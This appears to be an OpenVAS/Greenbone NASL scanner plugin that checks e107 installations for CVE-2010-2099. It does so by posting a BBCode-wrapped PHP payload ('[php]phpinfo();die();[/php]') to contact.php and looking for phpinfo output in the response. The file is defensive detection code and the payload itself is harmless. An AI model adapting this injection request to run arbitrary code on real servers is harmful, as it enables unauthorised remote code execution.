CPE = "cpe:/a:e107:e107";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100649" );
	script_version( "2020-05-08T08:34:44+0000" );
	script_tag( name: "last_modification", value: "2020-05-08 08:34:44 +0000 (Fri, 08 May 2020)" );
	script_tag( name: "creation_date", value: "2010-05-25 13:42:13 +0200 (Tue, 25 May 2010)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2010-2099" );
	script_bugtraq_id( 40252 );
	script_name( "e107 BBCode Arbitrary PHP Code Execution Vulnerability" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_dependencies( "e107_detect.sc" );
	script_mandatory_keys( "e107/installed" );
	script_require_ports( "Services/www", 80 );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/40252" );
	script_xref( name: "URL", value: "http://e107.org/" );
	script_xref( name: "URL", value: "http://www.php-security.org/2010/05/19/mops-2010-035-e107-bbcode-remote-php-code-execution-vulnerability/index.html" );
	script_tag( name: "summary", value: "e107 is prone to a remote PHP code-execution vulnerability." );
	script_tag( name: "affected", value: "e107 version 0.7.20 and prior are affected." );
	script_tag( name: "impact", value: "An attacker can exploit this issue to inject and execute arbitrary
  malicious PHP code in the context of the webserver process. This may facilitate a compromise of the
  application and the underlying system. Other attacks are also possible." );
	script_tag( name: "qod_type", value: "remote_app" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
variables = NASLString( "send-contactus=1&author_name=[php]phpinfo()%3bdie()%3b[/php]" );
url = dir + "/contact.php";
host = http_host_name( port: port );
req = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Referer: http://", host, url, "\\r\\n", "Host: ", host, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( variables ), "\\r\\n\\r\\n", variables );
res = http_keepalive_send_recv( port: port, data: req );
if(egrep( pattern: "<title>phpinfo\\(\\)</title>", string: res, icase: TRUE ) || ContainsString( res, "php.net" )){
	report = http_report_vuln_url( port: port, url: url );
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

